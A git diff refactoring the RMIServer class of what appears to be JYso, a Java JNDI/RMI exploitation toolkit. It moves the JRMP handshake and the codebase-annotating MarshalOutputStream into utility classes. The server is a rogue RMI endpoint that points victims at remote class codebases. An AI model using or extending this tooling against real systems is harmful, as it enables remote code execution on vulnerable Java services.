@@ -2,6 +2,8 @@ package com.qi4l.JYso;
 
 import com.qi4l.JYso.controllers.rmi.Basic;
 import com.qi4l.JYso.controllers.rmi.ELProcessor;
+import com.qi4l.JYso.gadgets.utils.JRMPUtils;
+import com.qi4l.JYso.gadgets.utils.MarshalOutputStream;
 import com.qi4l.JYso.gadgets.utils.Reflections;
 import com.sun.jndi.rmi.registry.ReferenceWrapper;
 import org.apache.naming.ResourceRef;
@@ -12,7 +14,6 @@ import sun.rmi.transport.TransportConstants;
 import javax.naming.Reference;
 import javax.net.ServerSocketFactory;
 import java.io.BufferedInputStream;
-import java.io.BufferedOutputStream;
 import java.io.DataInputStream;
 import java.io.DataOutputStream;
 import java.io.IOException;
@@ -20,13 +21,11 @@ import java.io.InputStream;
 import java.io.ObjectInputStream;
 import java.io.ObjectOutputStream;
 import java.io.ObjectStreamClass;
-import java.io.OutputStream;
 import java.net.InetSocketAddress;
 import java.net.ServerSocket;
 import java.net.Socket;
 import java.net.SocketException;
 import java.net.URL;
-import java.net.URLClassLoader;
 import java.rmi.MarshalException;
 import java.rmi.server.ObjID;
 import java.rmi.server.RemoteObject;
@@ -51,15 +50,16 @@ import static org.fusesource.jansi.Ansi.ansi;
 public class RMIServer implements Runnable {
 
     private final ServerSocket ss;
-    private final Object       waitLock = new Object();
-    private final URL          classpathUrl;
-    private       boolean      exit;
+    private final Object waitLock = new Object();
+    private final URL classpathUrl;
+    private boolean exit;
 
     public RMIServer(int port, URL classpathUrl) throws IOException {
         this.classpathUrl = classpathUrl;
         this.ss = ServerSocketFactory.getDefault().createServerSocket(port);
     }
 
+    @SuppressWarnings("HttpUrlsUsage")
     public static void start() {
         String url = (codeBase == null || codeBase.isEmpty()) ? "http://" + ip + ":" + httpPort + "/" : codeBase;
 
@@ -105,16 +105,11 @@ public class RMIServer implements Runnable {
                         bufIn.mark(4);
 
                         try (DataInputStream in = new DataInputStream(bufIn)) {
-                            int magic = in.readInt();
-                            short version = in.readShort();
-                            if (magic != TransportConstants.Magic || version != TransportConstants.Version) {
-                                s.close();
+                            DataOutputStream out = JRMPUtils.handshake(in, s);
+                            if (out == null) {
                                 continue;
                             }
-
-                            OutputStream sockOut = s.getOutputStream();
-                            BufferedOutputStream bufOut = new BufferedOutputStream(sockOut);
-                            try (DataOutputStream out = new DataOutputStream(bufOut)) {
+                            try {
                                 byte protocol = in.readByte();
                                 switch (protocol) {
                                     case TransportConstants.StreamProtocol:
@@ -137,8 +132,9 @@ public class RMIServer implements Runnable {
                                         continue;
                                 }
 
-                                bufOut.flush();
                                 out.flush();
+                            } finally {
+                                out.close();
                             }
                         }
                     } catch (InterruptedException e) {
@@ -285,36 +281,5 @@ public class RMIServer implements Runnable {
 
     private String normalizeClassName(String classPathLikeName) {
         return classPathLikeName.replace('/', '.').trim();
-    }
-
-    static final class MarshalOutputStream extends ObjectOutputStream {
-
-        private final URL sendUrl;
-
-        MarshalOutputStream(OutputStream out, URL u) throws IOException {
-            super(out);
-            this.sendUrl = u;
-        }
-
-        @Override
-        protected void annotateClass(Class<?> cl) throws IOException {
-            if (this.sendUrl != null) {
-                writeObject(this.sendUrl.toString());
-            } else if (!(cl.getClassLoader() instanceof URLClassLoader)) {
-                writeObject(null);
-            } else {
-                URL[] us = ((URLClassLoader) cl.getClassLoader()).getURLs();
-                StringBuilder cb = new StringBuilder();
-                for (URL u : us) {
-                    cb.append(u.toString());
-                }
-                writeObject(cb.toString());
-            }
-        }
-
-        @Override
-        protected void annotateProxyClass(Class<?> cl) throws IOException {
-            annotateClass(cl);
-        }
     }
 }
